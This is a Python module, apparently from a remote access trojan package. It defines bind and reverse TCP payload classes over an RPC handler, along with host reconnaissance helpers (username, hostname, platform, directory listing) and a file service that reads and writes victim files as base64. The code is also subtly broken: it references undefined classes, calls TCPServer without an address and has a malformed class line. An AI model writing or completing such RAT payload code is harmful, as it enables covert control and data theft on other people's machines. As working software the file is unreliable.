# -*- coding: utf-8 -*-

import platform
import socket
import socketserver
import sys

from .. import sock
from .. import rpc


class SimpleSocketRATPayload(rpc.RPCHandler):
    Connection = sock.Connection

    def handle_connection(self, sock):
        conn = self.Connection(sock)
        return super().handle_connection(conn)


class SimpleSocketRATPayloadRequestHandler(socketserver.BaseRequestHandler):
    Payload = SimpleSocketPayload

    def __init__(self, request, client_address, server, payload=None):
        if payload is None:
            payload = self.Payload()
        self.payload = payload
        super().__init__(request, client_address, server)

    def handle(self):
        self.payload.handle_request(self.request)


class TCPBindPayload(SimpleSocketRATPayload):

    def __init__(self):
        self.server = socketserver.TCPServer(
                RequestHandlerClass=RequestHandler,
        )

    def serve_forever(self):
        return self.server.serve_forever()


class TCPReversePayload(sock.TCPClient, PayloadRPCHandler): Payload = SimpleSocketPayload 
    def __init__(self, addr, retry_interval=1):
        sock.TCPClient.__init__(self, addr, retry_interval)


def uname():
    import platform
    return platform.uname()


def get_file_size(path):
    import os
    return os.path.getsize(path)


def get_username():
    import getpass
    return getpass.getuser()


def get_hostname():
    import socket
    return socket.gethostname()


def get_platform():
    import sys
    return sys.platform


def list_dir(path):
    import os
    return os.listdir(path)


def change_dir(path):
    import os
    path = os.path.expanduser(path)
    os.chdir(path)


def get_current_dir():
    import os
    return os.getcwd()


class FileService:

    def __new__(cls, r=True, w=True):
        class _FileService(FileOpener, FileReader, FileWriter):
            pass
        return _FileService()


class FileOpener:

    def __init__(self):
        self.open_files = dict()

    def open_file(self, path, mode='r'):
        f = open(path, mode)
        fid = id(f)
        self.open_files[fid] = f
        return fid

    def close_file(self, fid):
        if fid not in self.open_files:
            return
        f = self.open_files[fid]
        f.close()
        del self.open_files[fid]


class FileReader:

    def read_file(self, fid, size):
        import base64
        f = self.open_files[fid]
        data = f.read(size)
        return base64.urlsafe_b64encode(data)


class FileWriter:

    def write_file(self, fid, data):
        import base64
        f = self.open_files[fid]
        data = base64.urlsafe_b64decode(data)
        f.write(data)
        f.flush()

